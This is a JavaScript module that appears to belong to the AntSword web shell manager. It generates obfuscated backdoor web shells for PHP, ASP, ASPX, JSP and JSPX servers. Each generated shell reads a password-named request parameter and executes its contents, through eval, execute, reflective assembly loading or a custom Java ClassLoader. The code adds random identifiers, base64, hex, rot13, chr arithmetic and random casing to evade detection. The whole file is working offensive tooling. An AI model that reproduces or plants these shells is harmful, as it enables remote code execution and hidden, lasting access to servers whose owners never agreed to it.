/**
 * 核心模块
 */

class Core {
  constructor(argv) {
    let self = this;
    return new Promise((res, rej) => {
      switch (argv.type) {
        case "php":
          res(self._gen_php(argv.pwd));
          break;
        case "asp":
          res(self._gen_asp(argv.pwd));
          break;
        case "aspx":
          res(self._gen_aspx(argv.pwd));
          break;
        case "aspxcsharp":
          res(self._gen_aspxcsharp(argv.pwd));
          break;
        case "jsp":
          res(self._gen_jsp(argv.pwd));
          break;
        case "jspx":
          res(self._gen_jspx(argv.pwd));
          break;
        case "jspjs":
          res(self._gen_jspjs(argv.pwd));
          break;
        case "jspxjs":
          res(self._gen_jspxjs(argv.pwd));
          break;
        default:
          break;
      }
    })
  }

  _gen_aspxcsharp(pwd) {
    var data = `<%@ Page Language="c#"%>
<%
  String PAYLODNAME = Request.Form["${pwd}"];
  if (PAYLODNAME != null){
    System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(PAYLODNAME));
    assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(null);
  }
%>`;
    let vars = antSword['utils'].RandomChoice(antSword['RANDOMWORDS'], [], 6);
    data = data.replace(/PAYLODNAME/g, vars[0].toLowerCase());
    return data;
  }

  _gen_jspjs(pwd) {
    var data = `<%
  try {
    javax.script.ScriptEngine PENGINENAME = new javax.script.ScriptEngineManager().getEngineByName("js");
    PENGINENAME.put("request", request);
    PENGINENAME.put("response", response);
    PENGINENAME.eval(request.getParameter("${pwd}"));
  } catch (Exception e) {
    out.println("Error:// "+e.toString());;
  }
%>`;
    let vars = antSword['utils'].RandomChoice(antSword['RANDOMWORDS'], [], 6);
    data = data.replace(/PENGINENAME/g, vars[0].toLowerCase());
    return data;
  }

  _gen_jspxjs(pwd) {
    var data = `<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
<jsp:directive.page contentType="text/html" pageEncoding="UTF-8" />
  <jsp:scriptlet>
    try {
      javax.script.ScriptEngine PENGINENAME = new javax.script.ScriptEngineManager().getEngineByName("js");
      PENGINENAME.put("request", request);
      PENGINENAME.put("response", response);
      PENGINENAME.eval(request.getParameter("${pwd}"));
    } catch (Exception e) {
      out.println("Error:// "+e.toString);;
    }
  </jsp:scriptlet>
</jsp:root>`;
    let vars = antSword['utils'].RandomChoice(antSword['RANDOMWORDS'], [], 6);
    data = data.replace(/PENGINENAME/g, vars[0].toLowerCase());
    return data;
  }

  _gen_jspx(pwd) {
    var data = `<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
  <jsp:declaration>
    class PCLASSNAME extends ClassLoader {
      PCLASSNAME(ClassLoader c) { super(c);}
      public Class SCLASSNAME(byte[] b) {
        return super.defineClass(b, 0, b.length);
      }
    }
    public byte[] B64FUNCNAME(String str) throws Exception {
      Class base64;
      byte[] value = null;
      try {
        base64=Class.forName("sun.misc.BASE64Decoder");
        Object decoder = base64.newInstance();
        value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
      } catch (Exception e) {
        try {
          base64=Class.forName("java.util.Base64");
          Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
          value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
        } catch (Exception ee) {}
      }
      return value;
    }
  </jsp:declaration>
  <jsp:scriptlet>
    String cls = request.getParameter("ASPWD");
    if (cls != null) {
      new PCLASSNAME(this.getClass().getClassLoader()).SCLASSNAME(B64FUNCNAME(cls)).newInstance().equals(new Object[]{request,response});
    }
  </jsp:scriptlet>
</jsp:root>`;
    let vars = antSword['utils'].RandomChoice(antSword['RANDOMWORDS'], [], 6);
    data = data.replace(/PCLASSNAME/g, vars[0].toUpperCase());
    data = data.replace(/SCLASSNAME/g, vars[1]);
    data = data.replace(/B64FUNCNAME/g, vars[2]);
    data = data.replace("ASPWD", pwd);
    return data;
  }

  _gen_jsp(pwd) {
    var data = `<%!
class PCLASSNAME extends ClassLoader{
  PCLASSNAME(ClassLoader c){super(c);}
  public Class SCLASSNAME(byte[] b){
    return super.defineClass(b, 0, b.length);
  }
}
public byte[] B64FUNCNAME(String str) throws Exception {
  Class base64;
  byte[] value = null;
  try {
    base64=Class.forName("sun.misc.BASE64Decoder");
    Object decoder = base64.newInstance();
    value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
  } catch (Exception e) {
    try {
      base64=Class.forName("java.util.Base64");
      Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
      value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
    } catch (Exception ee) {}
  }
  return value;
}
%>
<%
String cls = request.getParameter("ASPWD");
if (cls != null) {
  new PCLASSNAME(this.getClass().getClassLoader()).SCLASSNAME(B64FUNCNAME(cls)).newInstance().equals(new Object[]{request,response});
}
%>
`;
    let vars = antSword['utils'].RandomChoice(antSword['RANDOMWORDS'], [], 6);
    data = data.replace(/PCLASSNAME/g, vars[0].toUpperCase());
    data = data.replace(/SCLASSNAME/g, vars[1]);
    data = data.replace(/B64FUNCNAME/g, vars[2]);
    data = data.replace("ASPWD", pwd);
    return data;
  }
  _gen_asp(pwd) {
    let self = this;
    let cmd = Buffer.from(self._randomCaseStr(`eval(request("${pwd}"))`)).toString('hex');
    let data = `<%<!--"-->
execute(con("${cmd}"))
Function con(ByRef strHex):Dim Length:Dim Max:Dim Str:Max = Len(strHex):For Length = 1 To Max Step 2:Str = Str & Chr("&h" & Mid(strHex, Length, 2)):Next:con = Str:End function')
%>`;
    return self._randomCaseStr(data);
  }
  _gen_aspx(pwd) {
      let self = this;
      let rnd = self._randint(1, 1000000);
      let cmd = Buffer.from(`${rnd};var safe="unsafe";eval(Request.Item['${pwd}'], safe);${rnd*3};`).toString('base64');
      let sli = [];
      for (var i = 0; i < cmd.length / 5 + 1; i++) {
        sli.push(cmd.slice(i * 5, i * 5 + 5));
      }
      let tmp = [];
      sli[4].split('').forEach((c, _, arr) => {
        tmp.push(self._aspx_encode_char(c, self._randint(1, 4)));
      });
      sli[4] = `'+${tmp.join("+")}+'`;
      tmp = [];
      sli[5].split('').forEach((c, _, arr) => {
        tmp.push(self._aspx_encode_char(c, self._randint(1, 4)));
      });
      sli[5] = `'+${tmp.join("+")}+'`;
      cmd = sli.join("'+'");
      let data = `<%@Page Language="Jscript"%>
<%eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('${cmd}')));%>
`;
      return data;
    }
    // 生成 php shell
  _gen_php(pwd) {
    let self = this;
    let rnd = self._randint(1, 1000000);
    let cmd = Buffer.from(`${rnd};@evAl($_POST[${pwd}]);${rnd*3};`).toString('base64');
    let sli = [];
    for (var i = 0; i < cmd.length / 5 + 1; i++) {
      sli.push(cmd.slice(i * 5, i * 5 + 5));
    }
    let tmp = [];
    sli[4].split('').forEach((c, _, arr) => {
      tmp.push(self._php_encode_char(c, self._randint(1, 4)));
    });
    sli[4] = `'.${tmp.join(".")}.'`;
    tmp = [];
    sli[5].split('').forEach((c, _, arr) => {
      tmp.push(self._php_encode_char(c, self._randint(1, 4)));
    });
    sli[5] = `'.${tmp.join(".")}.'`;
    cmd = sli.join("'.'");

    tmp = [];
    '$some'.split('').forEach((c, _, arr) => {
      tmp.push(self._php_encode_char(c, self._randint(1, 4)));
    });
    let para = tmp.join('.');
    tmp = [];
    'eval($some);'.split('').forEach((c, _, arr) => {
      tmp.push(self._php_encode_char(c, self._randint(1, 4)));
    });
    let func = tmp.join('.');
    let func_name = self._randomStr(4);
    let php_line = `<?php \$${func_name}=create_function(${para},${func});\$${func_name}(base64_decode('${cmd}'));?>`;
    return php_line;
  }
  _asp_encode_char(c, rnd) {
    let self = this;
    rnd = rnd || 1;
    var n = self._randint(200, 1000);
    switch (rnd) {
      case 2:
        return `chr(${n*c.charCodeAt()}/${n})`;
      default:
        return `chr(${n}-${n-(c.charCodeAt())})`;
    }
  }
  _aspx_encode_char(c, rnd) {
      let self = this;
      rnd = rnd || 1;
      switch (rnd) {
        case 1:
          return `System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('${Buffer.from(c).toString('base64')}'))`;
        case 2:
          var n = self._randint(200, 1000);
          switch (n % 3) {
            case 0:
              return `char(${n}-${n-(c.charCodeAt())})`;
            case 1:
              return `char(0x${n.toString(16)}-0x${(n-c.charCodeAt()).toString(16)})`;
            case 2:
              return `char(0${n.toString(8)}-0${(n-c.charCodeAt()).toString(8)})`;
          }
          break;
        case 3:
          var n = self._randint(200, 1000)
          switch (n % 3) {
            case 0:
              return `char(${n*c.charCodeAt()}/${n})`;
            case 1:
              return `char(0x${(n*c.charCodeAt()).toString(16)}/0x${n.toString(16)})`;
            case 2:
              return `char(0${(n*c.charCodeAt()).toString(8)}/0${n.toString(8)})`;
          }
          break;
        default:
          return `'${c}'`;
      }
    }
    /*
     * php 随机对字符进行转换
     */
  _php_encode_char(c, rnd) {
    let self = this;
    rnd = rnd || 1
    switch (rnd) {
      case 0:
        return `'${c}'`;
      case 1:
        return `base64_decode('${Buffer.from(c).toString('base64')}')`;
      case 2:
        var n = self._randint(200, 1000);
        switch (n % 3) {
          case 0:
            return `chr(${n}-${n-(c.charCodeAt())})`;
          case 1:
            return `chr(0x${n.toString(16)}-0x${(n-c.charCodeAt()).toString(16)})`;
          case 2:
            return `chr(0${n.toString(8)}-0${(n-c.charCodeAt()).toString(8)})`;
        }
        break;
      case 3:
        return `str_rot13('${self._rot13(c)}')`;
      case 4:
        var n = self._randint(200, 1000)
        switch (n % 3) {
          case 0:
            return `chr(${n*c.charCodeAt()}/${n})`;
          case 1:
            return `chr(0x${(n*c.charCodeAt()).toString(16)}/0x${n.toString(16)})`;
          case 2:
            return `chr(0${(n*c.charCodeAt()).toString(8)}/0${n.toString(8)})`;
        }
    }
  }

  _rot13(s) {
    //use a Regular Expression to Replace only the characters that are a-z or A-Z
    return s.replace(/[a-zA-Z]/g, function(c) {
      //Get the character code of the current character and add 13 to it
      //If it is larger than z's character code then subtract 26 to support wrap around.
      return String.fromCharCode((c <= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);
    });
  }
  _randint(n, m) {
      return Math.floor(Math.random() * (m - n + 1) + n);
    }
    // 随机产生指定长度字符串
  _randomStr(len) {
    len = len || 8;
    let chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    let maxPos = chars.length;
    let pwd = '';
    for (var i = 0; i < len; i++) {
      pwd += chars.charAt(Math.floor(Math.random() * maxPos));
    }
    return pwd;
  }
  _randomCaseStr(str) {
      let s = '';
      for (var i = 0; i < str.length; i++) {
        s += this._randomCaseChr(str[i]);
      }
      return s;
    }
    // 随机大小写
  _randomCaseChr(c) {
    if (this._randint(0, 1)) {
      return c.toUpperCase()
    }
    return c.toLowerCase()
  }
}

module.exports = Core;